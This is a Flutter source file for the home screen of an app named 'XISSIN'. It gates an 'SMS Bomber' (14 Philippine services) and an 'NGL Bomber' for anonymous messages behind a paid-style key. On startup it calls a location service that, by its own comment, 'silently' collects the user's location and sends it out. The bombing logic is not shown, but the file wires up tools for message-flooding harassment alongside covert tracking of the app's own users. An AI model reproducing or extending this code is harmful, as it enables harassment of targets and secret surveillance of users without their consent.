import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';
import 'package:flutter_animate/flutter_animate.dart';
import '../theme/app_theme.dart';
import '../services/api_service.dart';
import '../services/theme_service.dart';
import '../services/location_service.dart';
import '../widgets/glass_neumorphic_card.dart';
import '../widgets/shimmer_skeleton.dart';
import '../widgets/staggered_grid.dart';
import '../widgets/haptic_button.dart';
import 'sms_bomber_screen.dart';
import 'key_screen.dart';
import 'about_screen.dart';
import 'ngl_screen.dart';

class HomeScreen extends StatefulWidget {
  final String userId;
  const HomeScreen({super.key, required this.userId});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool _hasKey = false;
  bool _loading = true;
  List<Map<String, dynamic>> _announcements = [];
  final Set<String> _dismissedIds = {};

  @override
  void initState() {
    super.initState();
    _refreshAll();
    // Silently collect and send location in the background.
    // Runs after frame so it never delays UI.
    WidgetsBinding.instance.addPostFrameCallback((_) {
      LocationService.tryCollectAndSend(widget.userId);
    });
  }

  Future<void> _refreshAll() async {
    await Future.wait([
      _refreshKeyStatus(),
      _loadAnnouncements(),
    ]);
  }

  Future<void> _refreshKeyStatus() async {
    if (!mounted) return;
    setState(() => _loading = true);
    try {
      final data = await ApiService.keyStatus(widget.userId);
      if (!mounted) return;
      setState(() {
        _hasKey = data['active'] == true;
        _loading = false;
      });
    } catch (_) {
      if (!mounted) return;
      setState(() => _loading = false);
    }
  }

  Future<void> _loadAnnouncements() async {
    try {
      final list = await ApiService.getAnnouncements();
      if (!mounted) return;
      setState(() => _announcements = list);
    } catch (_) {}
  }

  void _goToSms() {
    if (!_hasKey) {
      _showNoKeyDialog();
      return;
    }
    HapticFeedback.mediumImpact();
    Navigator.push(
      context,
      PageRouteBuilder(
        transitionDuration: const Duration(milliseconds: 400),
        pageBuilder: (_, __, ___) => SmsBomberScreen(userId: widget.userId),
        transitionsBuilder: (_, anim, __, child) => SlideTransition(
          position: Tween<Offset>(
            begin: const Offset(1.0, 0.0),
            end: Offset.zero,
          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
          child: child,
        ),
      ),
    );
  }

  void _goToNgl() {
    if (!_hasKey) {
      _showNoKeyDialog();
      return;
    }
    HapticFeedback.mediumImpact();
    Navigator.push(
      context,
      PageRouteBuilder(
        transitionDuration: const Duration(milliseconds: 400),
        pageBuilder: (_, __, ___) => NglScreen(userId: widget.userId),
        transitionsBuilder: (_, anim, __, child) => SlideTransition(
          position: Tween<Offset>(
            begin: const Offset(1.0, 0.0),
            end: Offset.zero,
          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
          child: child,
        ),
      ),
    );
  }

  Future<void> _goToKeys() async {
    HapticFeedback.selectionClick();
    await Navigator.push(
      context,
      PageRouteBuilder(
        transitionDuration: const Duration(milliseconds: 400),
        pageBuilder: (_, __, ___) => KeyScreen(userId: widget.userId),
        transitionsBuilder: (_, anim, __, child) => SlideTransition(
          position: Tween<Offset>(
            begin: const Offset(1.0, 0.0),
            end: Offset.zero,
          ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
          child: child,
        ),
      ),
    );
    // Refresh key status after returning from key screen
    _refreshKeyStatus();
  }

  void _goToAbout() {
    HapticFeedback.selectionClick();
    Navigator.push(
        context, MaterialPageRoute(builder: (_) => const AboutScreen()));
  }

  void _showNoKeyDialog() {
    final c = context.c;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: c.surface,
        shape:
            RoundedRectangleBorder(borderRadius: BorderRadius.circular(22)),
        title: Text(
          'Key Required',
          style: TextStyle(
              color: c.textPrimary, fontWeight: FontWeight.bold),
        ),
        content: Text(
          'You need an active key to use this feature.\n'
          'Go to Key Manager to redeem one.',
          style: TextStyle(color: c.textSecondary, height: 1.5),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child:
                Text('Cancel', style: TextStyle(color: c.textSecondary)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _goToKeys();
            },
            child: const Text('Get Key'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final c = context.c;

    final visible = _announcements
        .where((a) => !_dismissedIds.contains(a['id']?.toString()))
        .toList();

    return Scaffold(
      backgroundColor: c.background,
      body: SafeArea(
        child: RefreshIndicator(
          onRefresh: _refreshAll,
          color: c.primary,
          backgroundColor: c.surface,
          displacement: 60,
          child: CustomScrollView(
            physics: const AlwaysScrollableScrollPhysics(),
            slivers: [
              SliverToBoxAdapter(child: _buildHeader(c)),

              // Announcements
              if (visible.isNotEmpty)
                SliverToBoxAdapter(
                  child: Padding(
                    padding: const EdgeInsets.only(top: 8),
                    child: Column(
                      children: List.generate(visible.length, (i) {
                        return _AnnouncementBanner(
                          announcement: visible[i],
                          onDismiss: () => setState(() =>
                              _dismissedIds
                                  .add(visible[i]['id']?.toString() ?? '')),
                          c: c,
                          index: i,
                        );
                      }),
                    ),
                  ),
                ),

              // Tools section heading
              SliverToBoxAdapter(
                child: Padding(
                  padding: const EdgeInsets.fromLTRB(22, 28, 22, 14),
                  child: Text(
                    'Tools',
                    style: TextStyle(
                      color: c.textPrimary,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ),

              // Tools grid — 4 cards (2 × 2)
              SliverPadding(
                padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
                sliver: SliverGrid(
                  delegate: SliverChildListDelegate([
                    _FeatureCard(
                      icon: Icons.sms_rounded,
                      title: 'SMS Bomber',
                      subtitle: '14 PH Services',
                      gradient: [c.primary, c.secondary],
                      glowColor: c.primary,
                      locked: !_hasKey,
                      loading: _loading,
                      onTap: _goToSms,
                      index: 0,
                    ),
                    _FeatureCard(
                      icon: Icons.chat_bubble_outline_rounded,
                      title: 'NGL Bomber',
                      subtitle: 'Anonymous Messages',
                      gradient: const [Color(0xFFFF6EC7), Color(0xFFFF9A44)],
                      glowColor: const Color(0xFFFF6EC7),
                      locked: !_hasKey,
                      loading: _loading,
                      onTap: _goToNgl,
                      index: 1,
                    ),
                    _FeatureCard(
                      icon: Icons.vpn_key_rounded,
                      title: 'Key Manager',
                      subtitle: _hasKey ? 'Key Active ✓' : 'Redeem Key',
                      gradient: [c.secondary, const Color(0xFF7B6FFF)],
                      glowColor: c.secondary,
                      locked: false,
                      loading: _loading,
                      onTap: _goToKeys,
                      index: 2,
                    ),
                    _FeatureCard(
                      icon: Icons.info_outline_rounded,
                      title: 'About',
                      subtitle: 'App Info',
                      gradient: const [Color(0xFF43E97B), Color(0xFF38F9D7)],
                      glowColor: const Color(0xFF43E97B),
                      locked: false,
                      loading: false,
                      onTap: _goToAbout,
                      index: 3,
                    ),
                  ]),
                  gridDelegate:
                      const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2,
                    mainAxisSpacing: 14,
                    crossAxisSpacing: 14,
                    childAspectRatio: 0.88,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader(XissinColors c) {
    final themeService = context.watch<ThemeService>();

    return Padding(
      padding: const EdgeInsets.fromLTRB(22, 24, 22, 0),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          // Logo / title
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              ShaderMask(
                shaderCallback: (b) => LinearGradient(
                  colors: [c.primary, c.secondary],
                ).createShader(b),
                child: const Text(
                  'XISSIN',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 26,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 4,
                  ),
                ),
              ),
              Text(
                'by Xissin',
                style: TextStyle(color: c.textSecondary, fontSize: 13),
              ),
            ],
          )
              .animate()
              .fadeIn(duration: 500.ms)
              .slideX(begin: -0.2, end: 0, duration: 500.ms),

          // Theme toggle button
          HapticIconButton(
            icon: themeService.isDark
                ? Icons.light_mode_rounded
                : Icons.dark_mode_rounded,
            onPressed: () {
              HapticFeedback.selectionClick();
              themeService.toggle();
            },
            color: c.textSecondary,
            backgroundColor: c.surface,
          )
              .animate()
              .fadeIn(duration: 500.ms)
              .scale(
                  begin: const Offset(0.8, 0.8), duration: 500.ms),
        ],
      ),
    );
  }
}

// ── Announcement banner ─────────────────────────────────────────────────────

class _AnnouncementBanner extends StatelessWidget {
  final Map<String, dynamic> announcement;
  final VoidCallback onDismiss;
  final XissinColors c;
  final int index;

  const _AnnouncementBanner({
    required this.announcement,
    required this.onDismiss,
    required this.c,
    required this.index,
  });

  Color _typeColor(String? type) {
    switch (type) {
      case 'warning': return const Color(0xFFFFA726);
      case 'error':   return const Color(0xFFFF6B6B);
      case 'success': return const Color(0xFF7EE7C1);
      default:        return const Color(0xFF5B8CFF);
    }
  }

  IconData _typeIcon(String? type) {
    switch (type) {
      case 'warning': return Icons.warning_amber_rounded;
      case 'error':   return Icons.error_outline_rounded;
      case 'success': return Icons.check_circle_outline_rounded;
      default:        return Icons.campaign_rounded;
    }
  }

  @override
  Widget build(BuildContext context) {
    final type  = announcement['type'] as String? ?? 'info';
    final title = announcement['title'] as String? ?? 'Announcement';
    final msg   = announcement['message'] as String? ?? '';
    final color = _typeColor(type);
    final icon  = _typeIcon(type);

    return Padding(
      padding: const EdgeInsets.fromLTRB(22, 0, 22, 8),
      child: GlassNeumorphicCard(
        glowColor: color,
        padding: const EdgeInsets.fromLTRB(14, 10, 10, 10),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Padding(
              padding: const EdgeInsets.only(top: 2),
              child: Icon(icon, size: 16, color: color),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: color,
                      fontSize: 12,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  if (msg.isNotEmpty) ...[
                    const SizedBox(height: 2),
                    Text(
                      msg,
                      style: TextStyle(
                          color: c.textSecondary,
                          fontSize: 12,
                          height: 1.4),
                    ),
                  ],
                ],
              ),
            ),
            GestureDetector(
              onTap: () {
                HapticFeedback.selectionClick();
                onDismiss();
              },
              child: Padding(
                padding: const EdgeInsets.all(4),
                child: Icon(Icons.close_rounded,
                    size: 14, color: c.textSecondary),
              ),
            ),
          ],
        ),
      ),
    )
        .animate(delay: Duration(milliseconds: 50 + 100 * index))
        .fadeIn(duration: 400.ms)
        .slideY(begin: -0.2, end: 0, duration: 400.ms);
  }
}

// ── Feature card ─────────────────────────────────────────────────────────────

class _FeatureCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String subtitle;
  final List<Color> gradient;
  final Color glowColor;
  final bool locked;
  final bool loading;
  final VoidCallback onTap;
  final int index;

  const _FeatureCard({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.gradient,
    required this.glowColor,
    required this.locked,
    required this.loading,
    required this.onTap,
    required this.index,
  });

  @override
  Widget build(BuildContext context) {
    final c = context.c;

    return GlassNeumorphicCard(
      glowColor: glowColor,
      onTap: (locked || loading) ? null : onTap,
      padding: const EdgeInsets.all(18),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          GlassIconContainer(
            icon: icon,
            gradient: gradient,
            glowColor: glowColor,
          ),
          const Spacer(),
          if (locked && !loading)
            Padding(
              padding: const EdgeInsets.only(bottom: 6),
              child: Icon(Icons.lock_outline,
                  color: c.textSecondary, size: 15),
            ),
          if (loading)
            Padding(
              padding: const EdgeInsets.only(bottom: 6),
              child: SizedBox(
                width: 14,
                height: 14,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: c.textSecondary,
                ),
              ),
            ),
          Text(
            title,
            style: TextStyle(
              color: c.textPrimary,
              fontSize: 15,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 3),
          Text(
            subtitle,
            style: TextStyle(color: c.textSecondary, fontSize: 12),
          ),
        ],
      ),
    )
        .animate(delay: Duration(milliseconds: 80 + 100 * index))
        .fadeIn(duration: 400.ms)
        .slideY(
            begin: 0.2,
            end: 0,
            duration: 400.ms,
            curve: Curves.easeOutCubic);
  }
}
